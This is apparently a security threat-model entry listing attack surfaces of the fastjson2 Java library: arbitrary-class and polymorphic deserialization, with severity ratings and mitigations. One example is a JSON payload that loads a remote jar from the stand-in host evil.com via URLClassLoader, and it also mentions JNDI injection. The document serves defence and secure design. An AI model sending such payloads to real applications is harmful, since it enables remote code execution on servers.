*   **Attack Surface: Unsafe Deserialization of Arbitrary Classes**
    *   **Description:**  The library's ability to deserialize JSON into arbitrary Java classes, often controlled by the `@type` field in the JSON, can be exploited to instantiate malicious classes.
    *   **How fastjson2 Contributes:** `fastjson2` processes the `@type` field and attempts to load and instantiate the specified class. If not properly restricted, this allows attackers to control class instantiation.
    *   **Example:** A malicious JSON payload like `{"@type":"java.net.URLClassLoader", "url":"http://evil.com/malicious.jar"}` could be used to load and execute arbitrary code if `URLClassLoader` is present in the classpath and not properly restricted. Another example involves using classes like `javax.naming.InitialContext` to perform JNDI injection.
    *   **Impact:** Remote Code Execution (RCE). Attackers can execute arbitrary code on the server running the application.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Disable auto-type support globally if not absolutely necessary. Configure `ParserConfig.getGlobalAutoTypeBeforeHandler()` to reject all classes by default.
        *   Implement strict whitelisting of allowed classes for deserialization. Only allow the deserialization of expected and safe classes.
        *   Avoid using `@type` if possible. Design your data structures to avoid the need for dynamic type resolution during deserialization.
        *   If `@type` is necessary, implement robust validation and sanitization of the class names before deserialization.
        *   Keep `fastjson2` updated to the latest version, as security patches often address deserialization vulnerabilities.

*   **Attack Surface: Polymorphic Deserialization Exploits**
    *   **Description:** When an application uses `fastjson2` for polymorphic deserialization (handling different object types based on JSON properties), attackers might manipulate type information to instantiate unexpected or malicious classes.
    *   **How fastjson2 Contributes:** `fastjson2` uses type hints or other mechanisms within the JSON to determine which class to instantiate during deserialization. If this logic is flawed or predictable, it can be exploited.
    *   **Example:** An application expects either a `Dog` or `Cat` object, but an attacker crafts a JSON payload that tricks `fastjson2` into instantiating a `MaliciousAction` class instead, leading to unintended consequences.
    *   **Impact:** Can range from Remote Code Execution (if the malicious class is exploitable) to data corruption or denial of service, depending on the instantiated class and its behavior.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Clearly define and strictly enforce the expected types for polymorphic deserialization.
        *   Use specific deserializers for each expected type instead of relying on generic polymorphic handling.
        *   Validate the type information in the JSON against a predefined set of allowed types before deserialization.
        *   Avoid relying solely on user-provided data to determine the type of object to deserialize.
